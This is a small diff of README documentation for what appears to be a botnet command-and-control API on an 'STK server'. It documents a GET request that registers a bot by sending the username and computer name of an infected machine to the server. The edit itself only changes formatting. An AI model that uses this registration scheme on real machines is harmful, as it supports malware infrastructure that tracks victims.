@@ -52,15 +52,14 @@
 > Warning! You need set you username and token in request
 > You can get you token in Remote Access Terminal. Just execute command 'token'
 
-
 `host`         This is ip of STK server  
 `username`     This is you account username on STK server.  
 `token`        This is you account token    on STK server.  
 `bot_uuid`     This is randomly generated uuid  
 
 ###### CREATE BOT:
-`bot_username`     This is the username of the bot on the infected computer.  
-`bot_computername` This is the computername of the bot on the infected computer.  
+> `bot_username`     This is the username of the bot on the infected computer.  
+> `bot_computername` This is the computername of the bot on the infected computer.  
 
 **GET REQUEST:** _httр://host/api.php?profile=username&token=token&bot_uuid=bot_uuid&bot_username=bot_username&bot_computername=bot_computername&create_user_
 ```json
